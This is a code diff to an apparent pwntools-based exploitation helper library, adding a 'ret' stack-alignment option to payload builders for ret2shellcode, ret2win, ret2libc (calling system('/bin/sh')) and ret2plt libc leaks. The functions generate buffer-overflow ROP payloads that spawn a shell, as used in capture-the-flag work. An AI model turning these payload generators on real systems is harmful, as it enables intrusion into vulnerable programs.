@@ -2,7 +2,7 @@ import math
 import re
 
 from pwn import ROP, asm, context, cyclic, cyclic_find, log, shellcraft, flat
-import pwn
+from pwnlib.rop.gadgets import Gadget
 
 from pwninit.helpers.utils import u64, upack
 from pwninit.helpers.constants import *
@@ -276,8 +276,6 @@ class PwnContext:
                 rop.call(func, params)
             else:
                 for value, gadget in rop.setRegisters(params):
-                    from pwnlib.rop.gadgets import Gadget
-
                     if isinstance(gadget, Gadget):
                         rop.raw(gadget)
                     else:
@@ -322,12 +320,13 @@ class PwnContext:
 
         return flat({offset_val: data} | opt, **kwargs)
 
-    def ret2shellcode(self, addr: int|str, **kwargs):
+    def ret2shellcode(self, addr: int|str, ret=True, **kwargs):
         """
         Generate a payload to return to shellcode at the specified address.
 
         Args:
             addr (int): The address of the shellcode.
+            ret (bool): If ropchain adds a ret before the start of the rop
             **kwargs: Additional arguments for `bof`.
 
         Returns:
@@ -360,16 +359,17 @@ class PwnContext:
         )
         padding = asm("nop") * padding_len
         addr += len(padding) // 2
-        payload = self.ropchain({addr: []})
+        payload = self.ropchain({addr: []}, ret)
         return self.bof(payload, opt={0: [padding, shellcode]}, **kwargs)
 
-    def ret2win(self, win, params=None, **kwargs):
+    def ret2win(self, win, params=None, ret=True, **kwargs):
         """
         Generate a payload to call a `win` function with the specified parameters.
 
         Args:
             win (str or int): The `win` function name or address.
             params (list): Arguments to pass to the `win` function.
+            ret (bool): If ropchain adds a ret before the start of the rop
             **kwargs: Additional arguments for `bof`.
 
         Returns:
@@ -378,37 +378,41 @@ class PwnContext:
         if params is None:
             params = []
         addr = self.resolve(win)
-        payload = self.ropchain({addr: params}, **kwargs)
+        payload = self.ropchain({addr: params}, ret)
         return self.bof(payload, **kwargs)
 
-    def ret2libc(self, **kwargs):
+    def ret2libc(self, ret=True, **kwargs):
         """
         Generate a payload to call `system("/bin/sh")` using libc.
+
+        Args:
+            ret (bool): If ropchain adds a ret before the start of the rop
 
         Returns:
             bytes: The generated payload.
         """
         system = self.libc.sym["system"]
         bin_sh = next(self.libc.search(b"/bin/sh\x00"))
-        payload = self.ropchain({system: [bin_sh]})
+        payload = self.ropchain({system: [bin_sh]}, ret)
         return self.bof(payload, **kwargs)
 
-    def ret2plt(self, func="puts", ret2main="main", **kwargs):
+    def ret2plt(self, func="puts", ret2main="main", ret=True, **kwargs):
         """
         Generate a payload to leak a libc address using the PLT.
 
         Args:
             func (str): The function to leak (default: "puts").
             ret2main (str): The function to return to after leaking (default: "main").
+            ret (bool): If ropchain adds a ret before the start of the rop
             **kwargs: Additional arguments for `bof`.
         """
         func_plt = self.elf.plt[func]
         func_got = self.elf.got[func]
         if ret2main:
             main_addr = self.resolve(ret2main)
-            payload = self.ropchain({func_plt: [func_got], main_addr: []})
+            payload = self.ropchain({func_plt: [func_got], main_addr: []}, ret)
         else:
-            payload = self.ropchain({func_plt: [func_got]})
+            payload = self.ropchain({func_plt: [func_got]}, ret)
         self.bof(payload, **kwargs)
         leak_val = upack(self.io.recv())
         self.libc.address = leak_val - self.libc.sym[func]
